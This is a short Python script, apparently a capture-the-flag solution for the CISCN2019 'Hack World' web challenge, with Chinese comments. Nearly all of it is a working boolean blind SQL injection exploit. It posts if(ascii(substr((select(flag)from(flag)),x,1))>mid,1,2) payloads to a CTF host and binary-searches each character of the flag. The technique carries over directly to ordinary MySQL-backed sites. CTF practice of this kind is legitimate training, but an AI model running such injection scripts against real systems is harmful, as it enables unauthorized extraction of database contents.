import requests
'''
ctf2
[CISCN2019 华北赛区 Day2 Web1]Hack World
'''
url = 'http://c3058e9bfbd1efd0c96abb01.http-ctf2.dasctf.com/index.php'
result = ''

for x in range(1, 50):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)" % (x, mid)#if(cond, A, B) 是 MySQL 函数：cond 成立取 A，否则取 B。这里用它把「字符 ASCII 是否大于 mid」这个布尔值，桥接成「页面是否发送1，出现 Hello」。
        data = {                                                           #%d 是整数占位符，% (x, mid) 按顺序填进去
            "id":payload
        }
        response = requests.post(url, data = data)
        if 'Hello' in response.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)